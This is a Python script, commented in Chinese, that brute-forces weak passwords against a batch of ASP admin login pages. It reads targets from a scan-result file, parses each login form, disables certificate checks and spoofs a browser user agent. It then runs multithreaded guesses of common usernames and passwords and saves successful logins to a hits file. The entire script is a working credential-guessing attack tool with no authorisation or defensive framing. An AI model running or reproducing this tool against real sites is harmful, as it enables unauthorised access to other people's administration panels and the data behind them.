#!/usr/bin/env python3
"""bf_asp_new.py - 新发现ASP后台批量弱口令爆破
目标: 从filter结果里筛出的asp后台
用法: python3 bf_asp_new.py
"""
import urllib.request, urllib.parse, ssl, re, sys, time
from concurrent.futures import ThreadPoolExecutor, as_completed

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
      "X-Requested-With": "XMLHttpRequest"}

PASSWORDS = ["admin", "admin123", "123456", "admin888", "12345678", "password",
             "admin@123", "admin1234", "123456a", "a123456", "666666", "888888",
             "000000", "qwer1234", "abc123", "admin666", "123123", "111111",
             "654321", "admin2023", "admin2024", "Admin123", "123qwe", "zxcvbnm",
             "admin12345", "root", "root123", "test", "test123", "q123456",
             "admin@123456", "Admin@123", "123456789", "1qaz2wsx", "qwe123"]

def fetch(url, timeout=8, data=None):
    try:
        req = urllib.request.Request(url, data=data.encode() if data else None,
            headers={**UA, "Content-Type": "application/x-www-form-urlencoded"} if data else UA)
        r = urllib.request.urlopen(req, timeout=timeout, context=ctx)
        return r.status, r.read(60000).decode("utf-8", "ignore"), r.geturl()
    except urllib.error.HTTPError as e:
        return e.code, e.read(60000).decode("utf-8", "ignore"), e.geturl()
    except Exception:
        return 0, "", ""

def get_forms(url):
    """分析登录表单字段"""
    st, body, _ = fetch(url)
    if st != 200:
        return None, body
    fields = re.findall(r'<input[^>]*name="([^"]+)"[^>]*>', body)
    action = re.search(r'<form[^>]*action="([^"]*)"', body, re.I)
    form_action = action.group(1) if action else url
    if not form_action.startswith("http"):
        base = url.split("/")[0] + "//" + url.split("/")[2]
        form_action = base + (form_action if form_action.startswith("/") else "/" + form_action)
    return fields, body

def try_login(target, user, pw):
    dom, path = target
    url = "http://" + dom + path
    fields, body = get_forms(url)
    if fields is None:
        return None
    # 常见字段映射
    data = {}
    user_field = "username" if "username" in fields else ("user" if "user" in fields else ("name" if "name" in fields else "account"))
    pw_field = "password" if "password" in fields else ("pwd" if "pwd" in fields else "pass")
    data[user_field] = user
    data[pw_field] = pw
    # 补充其他字段(验证码留空等)
    for f in fields:
        if f not in data:
            data[f] = ""
    st, resp, fu = fetch(url, data=data)
    # 成功判定: 跳转 或 出现后台特征
    if st == 302 and ("login" not in fu.lower() or fu != url):
        return (user, pw, "302:%s" % fu)
    if "欢迎" in resp or "管理首页" in resp or "退出" in resp or "logout" in resp.lower():
        if "错误" not in resp and "失败" not in resp:
            return (user, pw, "body-mark")
    return None

def main():
    targets = []
    with open("/tmp/asp_targets_new.txt") as f:
        for line in f:
            line = line.strip()
            if line and "\t" in line:
                parts = line.split("\t")
                targets.append((parts[0], parts[1]))
    print("ASP targets: %d" % len(targets), flush=True)

    hits = []
    with ThreadPoolExecutor(max_workers=8) as ex:
        futs = []
        for t in targets:
            for user in ["admin", "root", "administrator", "test"]:
                for pw in PASSWORDS[:20]:
                    futs.append(ex.submit(try_login, t, user, pw))
        for fu in as_completed(futs):
            try:
                r = fu.result()
            except Exception:
                r = None
            if r:
                hits.append(r)
                print("!!! HIT: %s" % (r,), flush=True)

    with open("/tmp/asp_hits.txt", "w") as f:
        for h in hits:
            f.write("\t".join(str(x) for x in h) + "\n")
    print("=== DONE: %d hits ===" % len(hits), flush=True)

if __name__ == "__main__":
    main()
